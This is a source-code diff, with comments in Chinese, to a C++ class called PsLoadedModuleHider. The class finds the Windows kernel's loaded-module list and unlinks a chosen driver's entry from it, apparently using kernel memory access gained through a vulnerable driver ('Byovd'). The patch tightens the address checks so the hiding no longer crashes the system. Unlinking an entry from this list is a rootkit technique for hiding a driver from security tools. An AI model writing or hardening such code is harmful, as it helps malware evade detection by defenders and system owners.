@@ -4704,9 +4704,13 @@ uint64_t PsLoadedModuleHider::LocatePsLoadedModuleList(uint64_t ntosBase) {
             uint16_t baseNameLen = kma.Read<uint16_t>(flink + LDR_BASE_DLL_NAME_OFF);
             if (baseNameLen != ntosNameBytes) continue;
 
-            // 条件 4: Flink + 0x60 (BaseDllName.Buffer) 指向内核池
+            // 条件 4: Flink + 0x60 (BaseDllName.Buffer) 指向非分页池
+            //   ★ v3.296 FIX-15: 严格白名单验证 baseNameBuf, 排除内核镜像区域 (有间隙页)
+            //     原代码只检查 > 0xFFFF8000, 若 baseNameBuf 落在内核镜像间隙页,
+            //     ReadKernelVA 允许但 driver memcpy 读取未映射页 → 0x50 蓝屏.
             uint64_t baseNameBuf = kma.Read<uint64_t>(flink + LDR_BASE_DLL_NAME_BUF_OFF);
-            if (baseNameBuf <= 0xFFFF800000000000ULL) continue;
+            if (baseNameBuf < 0xFFFFFA0000000000ULL || baseNameBuf >= 0xFFFFFC0000000000ULL) continue;
+            if (baseNameBuf + ntosNameBytes > 0xFFFFFC0000000000ULL) continue;
 
             // 条件 5: Buffer 内容 == L"ntoskrnl.exe"
             wchar_t readName[16] = {};
@@ -4764,10 +4768,16 @@ uint64_t PsLoadedModuleHider::FindEntryByBaseName(uint64_t listHead, const wchar
         uint16_t nameLen = kma.Read<uint16_t>(current + LDR_BASE_DLL_NAME_OFF);
         uint64_t nameBuf = kma.Read<uint64_t>(current + LDR_BASE_DLL_NAME_BUF_OFF);
 
-        if (nameLen > 0 && nameLen <= 256 && nameBuf > 0xFFFF800000000000ULL) {
+        // ★ v3.296 FIX-15: 严格白名单验证 nameBuf, 排除内核镜像区域 (有间隙页)
+        //   原代码只检查 > 0xFFFF8000, 若 nameBuf 落在内核镜像间隙页,
+        //   ReadKernelVA 允许但 driver memcpy 读取未映射页 → 0x50 蓝屏.
+        if (nameLen > 0 && nameLen <= 256 &&
+            nameBuf >= 0xFFFFFA0000000000ULL && nameBuf < 0xFFFFFC0000000000ULL) {
             uint16_t chars = nameLen / 2;
             wchar_t readName[128] = {};
             uint16_t readChars = chars < 127 ? chars : 127;
+            // ★ FIX-15: 确保 nameBuf + readChars*2 不超过非分页池上限
+            if (nameBuf + (uint64_t)readChars * 2 > 0xFFFFFC0000000000ULL) goto nextNode;
             if (kma.ReadKernelVA(nameBuf, readName, readChars * 2)) {
                 readName[readChars] = 0;
                 // 不区分大小写比较 (wcsicmp 在 manual-mapped DLL 中可能不可用, 用 _wcsicmp)
@@ -4779,6 +4789,7 @@ uint64_t PsLoadedModuleHider::FindEntryByBaseName(uint64_t listHead, const wchar
             }
         }
 
+    nextNode:
         // 下一个节点
         uint64_t next = kma.Read<uint64_t>(current);  // current.Flink
         if (next == current) break;  // 自循环 (避免死循环)
@@ -4795,6 +4806,13 @@ uint64_t PsLoadedModuleHider::FindEntryByBaseName(uint64_t listHead, const wchar
 bool PsLoadedModuleHider::PerformUnlink(uint64_t entryAddr, uint64_t listHead) {
     auto& kma = KernelMemoryAccessor::Instance();
     (void)listHead;  // 当前实现未使用 listHead (断链只需 prev/next)
+
+    // ★ v3.296 FIX-15: 验证 entryAddr 和 entryAddr+8 在非分页池白名单内
+    //   (FindEntryByBaseName 已验证 current+0x68, 但深度防御)
+    if (entryAddr < 0xFFFFFA0000000000ULL || entryAddr + 16 > 0xFFFFFC0000000000ULL) {
+        ByovdDiag("B564:Unlink: FAIL entryAddr outside whitelist\n");
+        return false;
+    }
 
     // 1. 读 current 的 Flink/Blink (InLoadOrderLinks)
     uint64_t curFlink = kma.Read<uint64_t>(entryAddr);       // current.Flink
@@ -4818,6 +4836,12 @@ bool PsLoadedModuleHider::PerformUnlink(uint64_t entryAddr, uint64_t listHead) {
         };
         if (!isValidListPtr(curFlink) || !isValidListPtr(curBlink)) {
             ByovdDiag("B564:Unlink: FAIL flink/blink outside whitelist\n");
+            return false;
+        }
+        // ★ v3.296 FIX-15: 确保 curFlink+8 和 curBlink+8 也在非分页池内
+        //   (写入操作需要写入这些地址, 若超过上限会写入分页池/系统 PTE → 蓝屏)
+        if (curFlink + 8 >= 0xFFFFFC0000000000ULL || curBlink + 8 >= 0xFFFFFC0000000000ULL) {
+            ByovdDiag("B564:Unlink: FAIL flink/blink+8 outside whitelist\n");
             return false;
         }
     }
